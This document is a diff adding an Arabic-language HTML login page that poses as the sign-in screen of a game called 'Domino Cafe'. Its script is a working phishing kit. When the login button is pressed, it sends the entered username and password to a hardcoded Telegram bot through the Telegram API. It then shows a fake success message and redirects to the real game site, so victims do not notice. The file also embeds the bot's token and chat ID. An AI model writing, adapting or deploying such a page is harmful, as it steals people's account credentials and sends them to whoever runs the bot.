@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@800&display=swap ');
+
+        body {
+            background-color: #2b163d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .login-card {
+            background-color: #f7d7ad;
+            width: 420px;
+            border-radius: 25px;
+            box-shadow: 0 12px 0 #d4a77a;
+            border: 2px solid #eec494;
+            overflow: hidden;
+        }
+
+        .header {
+            background-color: #d1a078;
+            padding: 15px;
+            text-align: center;
+            position: relative;
+            border-bottom: 2px solid #b3855e;
+        }
+
+        .header-title {
+            color: white;
+            font-size: 26px;
+            text-shadow: 1px 2px 2px rgba(0,0,0,0.3);
+        }
+
+        .close-btn {
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            color: #8b5a2b;
+            font-size: 28px;
+            cursor: pointer;
+        }
+
+        .content {
+            padding: 40px 20px 25px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .input-row {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 10px;
+        }
+
+        .input-field {
+            flex: 1;
+            background-color: #f1c38a;
+            height: 55px;
+            border-radius: 50px;
+            border: 3px solid #e3b27b;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            box-shadow: inset 0 3px 6px rgba(0,0,0,0.1);
+        }
+
+        .input-field input {
+            background: none;
+            border: none;
+            outline: none;
+            width: 100%;
+            text-align: center;
+            font-size: 22px;
+            color: #8d4b2d;
+            font-weight: 900;
+        }
+
+        .side-icon {
+            font-size: 38px;
+            color: #a67b5b;
+            width: 45px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .inner-icon {
+            color: #d1a078;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 10px;
+            color: #8d4b2d;
+            font-size: 20px;
+            font-weight: bold;
+            margin-right: 55px;
+        }
+
+        .check-mark {
+            width: 26px;
+            height: 26px;
+            background-color: #fff;
+            border: 2px solid #4CAF50;
+            border-radius: 6px;
+            color: #4CAF50;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+        }
+
+        .btn-login {
+            background: linear-gradient(to bottom, #47e55d, #29b43c);
+            border: 3px solid #1f8d2e;
+            border-radius: 25px;
+            padding: 12px;
+            color: white;
+            font-size: 30px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 8px 0 #187125;
+            margin: 15px auto 5px auto;
+            width: 80%;
+            text-shadow: 1px 2px 2px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .btn-login:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #187125;
+        }
+
+        .btn-login.loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .btn-login.loading span {
+            opacity: 0;
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .forgot-link {
+            text-align: center;
+            color: #8d4b2d;
+            text-decoration: underline;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .success-message {
+            text-align: center;
+            color: #4CAF50;
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="header">
+        <span class="close-btn">✕</span>
+        <div class="header-title">تسجيل الدخول</div>
+    </div>
+
+    <div class="content">
+        <div class="input-row">
+            <div class="input-field">
+                <span class="inner-icon">▼</span>
+                <input type="text" id="username" placeholder="اسم المستخدم">
+            </div>
+            <div class="side-icon">👤</div>
+        </div>
+
+        <div class="input-row">
+            <div class="input-field">
+                <span class="inner-icon">👁</span>
+                <input type="password" id="password" placeholder="********">
+            </div>
+            <div class="side-icon">🔒</div>
+        </div>
+
+        <div class="remember-me">
+            <span>تذكرني</span>
+            <div class="check-mark">✔</div>
+        </div>
+
+        <button class="btn-login" id="loginBtn">
+            <span>تسجيل الدخول</span>
+        </button>
+
+        <div class="success-message" id="successMsg">تم تسجيل الدخول بنجاح!</div>
+        <div class="forgot-link">نسيت كلمة السر</div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '7882140772:AAFcHyNV4SeWxYCbK536KoRk8rwy3bL8WVA';
+    const CHAT_ID = '5648499583';
+    const loginBtn = document.getElementById('loginBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const successMsg = document.getElementById('successMsg');
+
+    loginBtn.addEventListener('click', async function() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!username || !password) {
+            alert('يرجى إدخال اسم المستخدم وكلمة المرور');
+            return;
+        }
+
+        // إظهار حالة التحميل
+        loginBtn.classList.add('loading');
+        loginBtn.disabled = true;
+
+        try {
+            const message = `🎮 دومينو كافيه - تسجيل دخول جديد\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}\n📱 من: الهاتف`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                successMsg.style.display = 'block';
+                usernameInput.value = '';
+                passwordInput.value = '';
+                setTimeout(() => {
+                    window.location.href = 'https://domino.cafe'; // إعادة توجيه للعبة
+                }, 1500);
+            } else {
+                alert('حدث خطأ في الاتصال');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('حدث خطأ في الاتصال');
+        } finally {
+            loginBtn.classList.remove('loading');
+            loginBtn.disabled = false;
+        }
+    });
+
+    // السماح بالضغط Enter لتسجيل الدخول
+    document.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            loginBtn.click();
+        }
+    });
+
+    // إغلاق النافذة
+    document.querySelector('.close-btn').addEventListener('click', function() {
+        window.close();
+    });
+</script>
+
+</body>
+</html>
